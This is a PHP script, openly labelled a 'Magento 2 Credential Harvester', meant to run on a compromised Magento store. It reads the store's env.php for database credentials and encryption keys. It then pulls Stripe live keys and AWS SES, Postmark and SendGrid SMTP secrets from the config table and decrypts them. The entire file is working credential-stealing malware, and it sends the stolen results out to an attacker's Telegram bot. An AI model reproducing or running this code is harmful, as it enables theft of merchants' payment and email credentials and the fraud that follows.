<?php
/**
 * Magento 2 Credential Harvester
 * D1337 SOVEREIGN LABS
 * 
 * Extracts:
 * 1. Stripe Keys (sk_live, pk_live)
 * 2. AWS SES SMTP Credentials
 * 3. Postmark SMTP
 * 4. SendGrid SMTP
 * 
 * Auto-decrypts and sends to Telegram
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '512M');

echo "Starting Magento Credential Harvester...\n";

// ============================================
// TELEGRAM CONFIG (Hardcoded)
// ============================================
$tg_bot_token = 'YOUR_TELEGRAM_BOT_TOKEN'; ## Change Here
$tg_chat_id = 'YOUR_TELEGRAM_CHAT_ID'; ## Change Here

// ============================================
// TELEGRAM SEND FUNCTION
// ============================================
function send_telegram($msg, $file_path = null) {
    global $tg_bot_token, $tg_chat_id;
    if (empty($tg_bot_token) || $tg_bot_token === 'ENTER_BOT_TOKEN_HERE') return;

    // Send text message
    if ($msg) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendMessage";
        $data = ['chat_id' => $tg_chat_id, 'text' => $msg, 'parse_mode' => 'HTML'];
        
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 10
            ]
        ];
        $context = stream_context_create($options);
        @file_get_contents($url, false, $context);
    }

    // Send file
    if ($file_path && file_exists($file_path)) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendDocument";
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            $cfile = new CURLFile($file_path);
            $data = ['chat_id' => $tg_chat_id, 'document' => $cfile];
            
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
            curl_exec($ch);
            curl_close($ch);
        }
    }
}

// ============================================
// FIND env.php
// ============================================
function findEnvPhp() {
    $roots = [
        dirname(__FILE__) . '/../../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../app/etc/env.php',
        dirname(__FILE__) . '/../../app/etc/env.php',
        dirname(__FILE__) . '/../app/etc/env.php',
        dirname(__FILE__) . '/app/etc/env.php',
        $_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php'
    ];
    foreach ($roots as $file) {
        if (file_exists($file)) return realpath($file);
    }
    return null;
}

$envFile = findEnvPhp();
if (!$envFile) die("Error: app/etc/env.php not found.\n");

$env = include $envFile;
$dbConf = $env['db']['connection']['default'];
$host = $dbConf['host'] ?? 'localhost';
// Try both localhost and 127.0.0.1 if connection fails
$hosts = [$host, 'localhost', '127.0.0.1'];
$user = $dbConf['username'] ?? '';
$pass = $dbConf['password'] ?? '';
$dbname = $dbConf['dbname'] ?? '';
$prefix = $env['db']['table_prefix'] ?? '';

// Get encryption keys
$keys = [];
if (isset($env['crypt']['key'])) $keys[] = $env['crypt']['key'];
$dir = dirname($envFile);
foreach (glob($dir . '/env*.php*') as $f) {
    if ($f == $envFile) continue;
    $c = file_get_contents($f);
    if (preg_match("/'key'\s*=>\s*'([^']+)'/", $c, $m)) $keys[] = $m[1];
}
$keys = array_unique($keys);
echo "Loaded " . count($keys) . " encryption keys.\n";

// ============================================
// DECRYPT FUNCTIONS
// ============================================
if (!defined('SODIUM_CRYPTO_SECRETBOX_KEYBYTES')) define('SODIUM_CRYPTO_SECRETBOX_KEYBYTES', 32);
if (!defined('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES')) define('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES', 24);

function standalone_sodium_decrypt($encrypted_full, $key) {
    if (!function_exists('sodium_crypto_secretbox_open')) return false;
    $parts = explode(':', $encrypted_full);
    if (count($parts) < 3) return false;
    $payload = base64_decode(end($parts));
    if (!$payload || strlen($payload) < SODIUM_CRYPTO_SECRETBOX_NONCEBYTES) return false;
    $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    
    // Build all possible key candidates
    $candidates = [];
    
    // If key is 32 hex chars (16 bytes raw)
    if (strlen($key) == 32 && ctype_xdigit($key)) {
        $hex_bytes = hex2bin($key);
        
        // Method 1: HKDF with empty salt/info (Magento 2.4.0-2.4.3)
        if (function_exists('hash_hkdf')) {
            $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', '');
        }
        
        // Method 2: HKDF with salt = raw key (Magento 2.4.4+)
        if (function_exists('hash_hkdf')) {
            $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', $key);
        }
        
        // Method 3: Double the key
        $candidates[] = $hex_bytes . $hex_bytes;
        
        // Method 4: Pad to 32 bytes
        $candidates[] = str_pad($hex_bytes, 32, "\0");
        
        // Method 5: Use raw string as key material
        if (function_exists('hash_hkdf')) {
            $candidates[] = hash_hkdf('sha256', $key, 32, '', '');
        }
    }
    
    // If key is 64 hex chars (32 bytes raw)
    if (strlen($key) == 64 && ctype_xdigit($key)) {
        $candidates[] = hex2bin($key);
    }
    
    // Standard attempts
    $candidates[] = $key;
    $candidates[] = md5($key);
    $candidates[] = substr($key, 0, 32);
    
    foreach ($candidates as $k) {
        if (!is_string($k) || strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
        try {
            $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
            if ($pt !== false) return $pt;
        } catch (Exception $e) {}
    }
    return false;
}

function standalone_mcrypt_decrypt($value, $key) {
    if (!function_exists('mcrypt_decrypt')) return false;
    $pt = @mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $value, MCRYPT_MODE_ECB);
    return rtrim($pt, "\0");
}

function smart_decrypt($value, $keys) {
    // Debug: Log what type we're receiving
    if (!is_string($value)) {
        error_log("WARNING: smart_decrypt received non-string: " . gettype($value) . " = " . var_export($value, true));
        $value = (string)$value;
    }
    
    // Validate input - must be a non-empty string
    if (!$value || trim($value) === '' || $value === '0' || $value === '1') {
        return '';
    }
    
    // Try using Magento's native decryption first (most reliable)
    static $magento_encryptor = null;
    if ($magento_encryptor === null) {
        try {
            // Try to load Magento bootstrap
            $bootstrap_path = dirname(findEnvPhp()) . '/../../app/bootstrap.php';
            if (file_exists($bootstrap_path)) {
                require_once $bootstrap_path;
                $bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $_SERVER);
                $obj = $bootstrap->getObjectManager();
                $magento_encryptor = $obj->get('\Magento\Framework\Encryption\EncryptorInterface');
            }
        } catch (Exception $e) {
            // Magento bootstrap failed, use standalone methods
            $magento_encryptor = false;
        }
    }
    
    // Use Magento's native decryptor if available
    if ($magento_encryptor !== false && is_object($magento_encryptor)) {
        try {
            // Extra safety check - ensure value is string before passing to Magento
            if (!is_string($value)) {
                $value = (string)$value;
            }
            
            // Additional validation - Magento encrypted values have specific formats
            // Skip Magento decrypt if value looks invalid
            if (strlen($value) > 5 && $value !== '0' && $value !== '1' && strpos($value, ':') !== false) {
                // Suppress all errors from Magento internals
                set_error_handler(function() { return true; });
                $decrypted = @$magento_encryptor->decrypt($value);
                restore_error_handler();
                
                if ($decrypted && $decrypted !== $value && is_string($decrypted)) {
                    return $decrypted;
                }
            }
        } catch (Exception $e) {
            // Fall through to standalone methods
        } catch (TypeError $e) {
            // Type error from Magento internals, skip it
        } catch (Error $e) {
            // PHP 7+ errors, skip it
        }
    }
    
    // Fallback to standalone decryption
    foreach ($keys as $k) {
        // Sodium encryption (version 3) - format: 0:3:base64 or :3:base64
        if (strpos($value, ':3:') !== false || preg_match('/^0:3:/', $value)) {
            $pt = standalone_sodium_decrypt($value, $k);
            if ($pt && $pt !== $value) return $pt;
        }
        // Older mcrypt encryption (no colons or version 2)
        if (strpos($value, ':') === false || preg_match('/^0:2:/', $value)) {
            $pt = standalone_mcrypt_decrypt($value, $k);
            if ($pt && $pt !== $value) return $pt;
        }
    }
    return $value;
}

// ============================================
// DATABASE CONNECTION
// ============================================
try {
    $dsn = "mysql:host=$host;dbname=$dbname;charset=utf8";
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
} catch (PDOException $e) {
    die("DB Connection Failed: " . $e->getMessage() . "\n");
}

// ============================================
// GET HOSTNAME
// ============================================
$host_name = php_uname('n');
if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== 'localhost') {
    $host_name = $_SERVER['HTTP_HOST'];
} else {
    try {
        $cfg_sql = "SELECT value FROM " . $prefix . "core_config_data WHERE path = 'web/unsecure/base_url' LIMIT 1";
        $cfg_stmt = $pdo->query($cfg_sql);
        $base_url = $cfg_stmt->fetchColumn();
        if ($base_url) {
            $parsed = parse_url($base_url);
            if (isset($parsed['host'])) $host_name = $parsed['host'];
        }
    } catch (Exception $e) {}
}

$server_ip = gethostbyname($host_name);
if (isset($_SERVER['SERVER_ADDR'])) $server_ip = $_SERVER['SERVER_ADDR'];

send_telegram("🔍 <b>Credential Harvester Started</b>\nHost: $host_name\nIP: $server_ip");

// ============================================
// HARVEST CREDENTIALS (DYNAMIC SEARCH)
// ============================================
$results = [];

// Dynamic search queries for maximum precision
$search_queries = [
    // Stripe Keys
    "SELECT path, value, 'Stripe' as category FROM " . $prefix . "core_config_data 
     WHERE path LIKE '%stripe%' 
        OR path LIKE '%sk_live%' 
        OR path LIKE '%pk_live%' 
        OR value LIKE 'sk_live_%' 
        OR value LIKE 'pk_live_%'
        OR value LIKE 'sk_test_%' 
        OR value LIKE 'pk_test_%'",
    
    // AWS SES / SMTP (more specific)
    "SELECT path, value, 'AWS_SES' as category FROM " . $prefix . "core_config_data 
     WHERE (path LIKE '%smtp%' AND (path LIKE '%host%' OR path LIKE '%username%' OR path LIKE '%password%' OR path LIKE '%auth%' OR path LIKE '%port%' OR path LIKE '%from%'))
        OR path LIKE '%trans_email/ident_general/email%'
        OR path LIKE '%aws%' 
        OR path LIKE '%ses%access%'
        OR path LIKE '%ses%secret%'
        OR path LIKE '%ses%region%'
        OR value LIKE 'AKIA%'
        OR value LIKE '%smtp.%'
        OR value LIKE '%mail.%'",
    
    // Postmark
    "SELECT path, value, 'Postmark' as category FROM " . $prefix . "core_config_data 
     WHERE path LIKE '%postmark%' 
        OR value LIKE '%postmarkapp.com%'",
    
    // SendGrid
    "SELECT path, value, 'SendGrid' as category FROM " . $prefix . "core_config_data 
     WHERE path LIKE '%sendgrid%' 
        OR value LIKE 'SG.%'
        OR value LIKE '%sendgrid.net%'",
];

$all_rows = [];
foreach ($search_queries as $query) {
    try {
        $stmt = $pdo->query($query);
        $rows = $stmt->fetchAll();
        $all_rows = array_merge($all_rows, $rows);
    } catch (Exception $e) {
        echo "Query failed: " . $e->getMessage() . "\n";
    }
}

// Remove duplicates based on path
$unique_rows = [];
$seen_paths = [];
foreach ($all_rows as $row) {
    if (!isset($seen_paths[$row['path']])) {
        $unique_rows[] = $row;
        $seen_paths[$row['path']] = true;
    }
}

echo "Found " . count($unique_rows) . " config entries.\n";

foreach ($unique_rows as $row) {
    $path = $row['path'];
    $value = $row['value'];
    $category = $row['category'] ?? 'Unknown';
    
    // Force cast to string and validate
    $value = (string)$value;
    
    // Skip if value is empty or invalid
    if (!$value || trim($value) === '' || $value === '0' || $value === 'false') continue;
    
    // Auto-detect label from path
    $path_parts = explode('/', $path);
    $label = end($path_parts);
    $label = str_replace('_', ' ', $label);
    $label = ucwords($label);
    
    // Try to decrypt
    $decrypted = smart_decrypt($value, $keys);
    
    // Clean up binary/garbled output
    if ($decrypted && !mb_check_encoding($decrypted, 'UTF-8')) {
        if (strlen($decrypted) < 10 || !ctype_print(str_replace([' ', "\t", "\n", "\r"], '', $decrypted))) {
            $decrypted = $value;
        }
    }
    
    // If decrypted value looks like encrypted format, use original
    if ($decrypted !== $value && strpos($decrypted, ':') !== false && !preg_match('/^[a-zA-Z0-9_\-\.@]+/', $decrypted)) {
        $decrypted = $value;
    }
    
    // Store result
    $results[] = [
        'label' => $label,
        'path' => $path,
        'category' => $category,
        'raw' => $value,
        'decrypted' => $decrypted,
        'is_encrypted' => ($decrypted !== $value && strpos($value, ':') !== false)
    ];
}

// ============================================
// FORMAT AND SEND RESULTS
// ============================================
$output = "";
$output .= str_repeat("=", 60) . "\n";
$output .= "  MAGENTO CREDENTIAL HARVEST RESULTS\n";
$output .= "  BOB MARLEY LABS\n";
$output .= str_repeat("=", 60) . "\n\n";
$output .= "Host: $host_name\n";
$output .= "IP: $server_ip\n";
$output .= "Date: " . date('Y-m-d H:i:s') . "\n\n";
$output .= str_repeat("=", 60) . "\n\n";

// Categorize results
$stripe_keys = [];
$aws_ses = [];
$postmark = [];
$sendgrid = [];
$smtp_generic = [];

foreach ($results as $r) {
    $val = $r['decrypted'];
    $category = $r['category'];
    $path = $r['path'];
    
    // Categorize by query category and value patterns
    if ($category === 'Stripe' || strpos($val, 'sk_') === 0 || strpos($val, 'pk_') === 0) {
        $stripe_keys[] = $r;
    } elseif ($category === 'AWS_SES' || strpos($val, 'AKIA') === 0 || strpos($path, 'aws') !== false || strpos($path, 'ses') !== false) {
        $aws_ses[] = $r;
    } elseif ($category === 'Postmark' || strpos($val, 'postmark') !== false || strpos($path, 'postmark') !== false) {
        $postmark[] = $r;
    } elseif ($category === 'SendGrid' || strpos($val, 'SG.') === 0 || strpos($path, 'sendgrid') !== false) {
        $sendgrid[] = $r;
    } else {
        // Generic SMTP (mail/smtp configs that don't match above)
        if (strpos($path, 'smtp') !== false || strpos($path, 'mail') !== false) {
            $smtp_generic[] = $r;
        }
    }
}

// Format Stripe
if (!empty($stripe_keys)) {
    $output .= "[STRIPE KEYS]\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($stripe_keys as $r) {
        $val = $r['decrypted'];
        // Only show if it's a valid looking value
        if (strlen($val) > 3 && (strpos($val, 'sk_') === 0 || strpos($val, 'pk_') === 0 || in_array($val, ['test', 'live']))) {
            $output .= sprintf("%-20s: %s\n", $r['label'], $val);
        }
    }
    $output .= "\n";
}

// Format AWS SES / SMTP
if (!empty($aws_ses)) {
    // Group credentials by type
    $smtp_config = [
        'host' => '',
        'port' => '',
        'username' => '',
        'password' => '',
        'from_email' => '',
        'authentication' => '',
        'aws_access_key' => '',
        'aws_secret_key' => '',
        'aws_region' => ''
    ];
    
    // Filter and extract actual credentials
    $smtp_keys = ['host', 'username', 'password', 'port', 'authentication', 'auth', 
                  'aws', 'ses', 'access_key', 'secret_key', 'region', 'smtp_'];
    
    foreach ($aws_ses as $r) {
        $val = $r['decrypted'];
        $path = strtolower($r['path']);
        $label = strtolower($r['label']);
        
        // Debug: show all paths and values
        // echo "DEBUG: Path=$path | Value=$val\n";
        
        // Map to config structure
        if (strpos($path, 'host') !== false && strpos($path, 'smtp') !== false) {
            $smtp_config['host'] = $val;
        } elseif (strpos($path, 'port') !== false && (strpos($path, 'smtp') !== false || is_numeric($val))) {
            $smtp_config['port'] = $val;
        } elseif (strpos($path, 'username') !== false && strpos($path, 'smtp') !== false) {
            $smtp_config['username'] = $val;
        } elseif (strpos($path, 'password') !== false && strpos($path, 'smtp') !== false) {
            $smtp_config['password'] = $val;
        } elseif (strpos($path, 'authentication') !== false || (strpos($path, 'auth') !== false && strpos($path, 'smtp') !== false)) {
            $smtp_config['authentication'] = $val;
        } elseif (strpos($path, 'access_key') !== false || strpos($val, 'AKIA') === 0) {
            $smtp_config['aws_access_key'] = $val;
        } elseif (strpos($path, 'secret_key') !== false) {
            $smtp_config['aws_secret_key'] = $val;
        } elseif (strpos($path, 'region') !== false && strpos($path, 'aws') !== false) {
            $smtp_config['aws_region'] = $val;
        } elseif (strpos($val, '@') !== false && filter_var($val, FILTER_VALIDATE_EMAIL)) {
            // Detect email from various paths
            if (strpos($path, 'trans_email/ident_general/email') !== false || 
                strpos($path, 'smtp') !== false && strpos($path, 'from') !== false) {
                if (!$smtp_config['from_email']) { // Only set if not already set
                    $smtp_config['from_email'] = $val;
                }
            }
        }
    }
    
    // Fallback: if no from_email found, search for any email in aws_ses results
    if (!$smtp_config['from_email']) {
        foreach ($aws_ses as $r) {
            $val = $r['decrypted'];
            if (strpos($val, '@') !== false && filter_var($val, FILTER_VALIDATE_EMAIL)) {
                $smtp_config['from_email'] = $val;
                break;
            }
        }
    }
    
    // Check if we have actual SMTP credentials (not just email)
    $has_smtp = $smtp_config['host'] || $smtp_config['username'] || $smtp_config['password'];
    $has_aws = $smtp_config['aws_access_key'] || $smtp_config['aws_secret_key'];
    
    if ($has_smtp || $has_aws) {
        $output .= "[SMTP / AWS SES CREDENTIALS]\n";
        $output .= str_repeat("-", 60) . "\n";
        
        // Output grouped config
        if ($smtp_config['host']) {
            $output .= sprintf("%-20s: %s\n", "Host", $smtp_config['host']);
        }
        if ($smtp_config['port']) {
            $output .= sprintf("%-20s: %s\n", "Port", $smtp_config['port']);
        }
        if ($smtp_config['username']) {
            $output .= sprintf("%-20s: %s\n", "Username", $smtp_config['username']);
        }
        if ($smtp_config['password']) {
            $output .= sprintf("%-20s: %s\n", "Password", $smtp_config['password']);
        }
        if ($smtp_config['from_email']) {
            $output .= sprintf("%-20s: %s\n", "From Email", $smtp_config['from_email']);
        }
        if ($smtp_config['authentication']) {
            $output .= sprintf("%-20s: %s\n", "Authentication", $smtp_config['authentication']);
        }
        
        // AWS SES if present
        if ($smtp_config['aws_access_key']) {
            $output .= "\n";
            $output .= sprintf("%-20s: %s\n", "AWS Access Key", $smtp_config['aws_access_key']);
        }
        if ($smtp_config['aws_secret_key']) {
            $output .= sprintf("%-20s: %s\n", "AWS Secret Key", $smtp_config['aws_secret_key']);
        }
        if ($smtp_config['aws_region']) {
            $output .= sprintf("%-20s: %s\n", "AWS Region", $smtp_config['aws_region']);
        }
        
        $output .= "\n";
    }
}

// Format Postmark
if (!empty($postmark)) {
    $output .= "[POSTMARK SMTP]\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($postmark as $r) {
        $val = $r['decrypted'];
        if (strlen($val) > 2) {
            $output .= sprintf("%-20s: %s\n", $r['label'], $val);
        }
    }
    $output .= "\n";
}

// Format SendGrid
if (!empty($sendgrid)) {
    $output .= "[SENDGRID SMTP]\n";
    $output .= str_repeat("-", 60) . "\n";
    foreach ($sendgrid as $r) {
        $val = $r['decrypted'];
        if (strlen($val) > 2) {
            $output .= sprintf("%-20s: %s\n", $r['label'], $val);
        }
    }
    $output .= "\n";
}

// Format Generic SMTP (already included in AWS SES section above)
// Removed to avoid duplication

if (empty($stripe_keys) && empty($postmark) && empty($sendgrid) && !$has_smtp && !$has_aws) {
    $output .= "[NO CREDENTIALS FOUND]\n";
    $output .= str_repeat("-", 60) . "\n";
    $output .= "No payment gateway or SMTP credentials found in database.\n";
    $output .= "This site may use default settings or external mail services.\n\n";
}

$output .= str_repeat("=", 60) . "\n";
$output .= "Total Entries: " . count($results) . "\n";

// Save to file
$clean_host = preg_replace('/[^a-zA-Z0-9.-]/', '_', $host_name);
$outFile = __DIR__ . '/' . $clean_host . '-credentials.txt';
file_put_contents($outFile, $output);

echo $output;

// Send to Telegram
if (empty($stripe_keys) && empty($postmark) && empty($sendgrid) && !$has_smtp && !$has_aws) {
    // No credentials found - just send message without file
    send_telegram("⚠️ <b>No Credentials Found</b>\n\nHost: $host_name\nIP: $server_ip\n\nNo payment gateway or SMTP credentials found in database.");
    echo "\nSaved to: $outFile\n";
    echo "Sent to Telegram (no credentials found).\n";
} else {
    // Credentials found - send file
    send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nIP: $server_ip\nFound: " . count($results) . " entries", $outFile);
    echo "\nSaved to: $outFile\n";
    echo "Sent to Telegram!\n";
}
?>
